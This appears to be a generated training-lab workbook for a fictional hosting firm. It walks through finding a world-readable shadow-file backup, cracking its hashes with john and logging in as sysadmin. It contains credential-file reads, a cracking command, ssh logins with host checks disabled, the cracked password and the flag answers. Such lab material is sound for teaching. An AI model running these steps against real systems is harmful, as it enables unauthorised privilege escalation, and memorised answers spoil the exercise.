# Ironforge Systems - Password Hash Cracking

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-3-2-password-hash-cracking/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Ironforge Systems - Password Hash Cracking** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **45 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Ironforge Systems, a managed hosting provider in Denver, has a server that
recently underwent a system backup. The backup process, configured by a
former sysadmin, copies sensitive files to a world-readable directory.

You've been given low-privilege SSH access as the "technician" account
during an internal security assessment. Your objective is to find exposed
password hashes, crack them, and demonstrate the risk of privilege
escalation through password reuse.

Rachel Kim (Security Manager) is watching: "Our sysadmin left last month.
I know his backup scripts were sloppy, but I want to see exactly how bad
it is. Show me the worst case."

**Credentials**

- Target SSH: `technician` / `Ir0nf0rg3_T3ch#`

## Your Objectives

- Discover exposed password hash files through filesystem enumeration
- Identify hash types and select appropriate cracking tools
- Use john the ripper or hashcat to crack weak password hashes
- Escalate privileges using cracked credentials
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SSH as technician**

```bash
sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@<target> 'whoami' 2>&1
```

Expected: `technician`

**Discover exposed shadow backup**

```bash
sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@<target> 'cat /opt/ironforge/backups/shadow.bak | grep sysadmin | cut -d: -f1' 2>&1
```

Expected: `sysadmin`

**Find token 1 in backup directory**

```bash
sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@<target> 'cat /opt/ironforge/backups/assessment_token.txt' 2>&1
```

Expected: `cr4ck3d`

**Switch to sysadmin with cracked password and read flag**

```bash
sshpass -p 'dragon' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@<target> 'cat /home/sysadmin/flag.txt' 2>&1
```

Expected: `h4sh3s`

**Verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{...}`


### Hint ladder

<details><summary>Hint 1 (unlocks after 8 minutes)</summary>

Start by exploring the filesystem for backup files. Common backup
locations include /opt, /var/backups, /tmp, and home directories.
Look for files named shadow, passwd, or anything with .bak extension.

</details>

<details><summary>Hint 2 (unlocks after 18 minutes)</summary>

There's a backup of /etc/shadow at /opt/ironforge/backups/shadow.bak.
It's world-readable (the vulnerability). Copy the hashes and crack
them with john: john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
Focus on the sysadmin user - their password is weak.

</details>

<details><summary>Hint 3 (unlocks after 26 minutes)</summary>

Crack the shadow.bak file with john. The sysadmin password is "dragon".
Switch to the sysadmin account: su sysadmin (password: dragon).
Then read /home/sysadmin/flag.txt for the second flag part.
The first part is in the backup directory alongside the shadow file.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
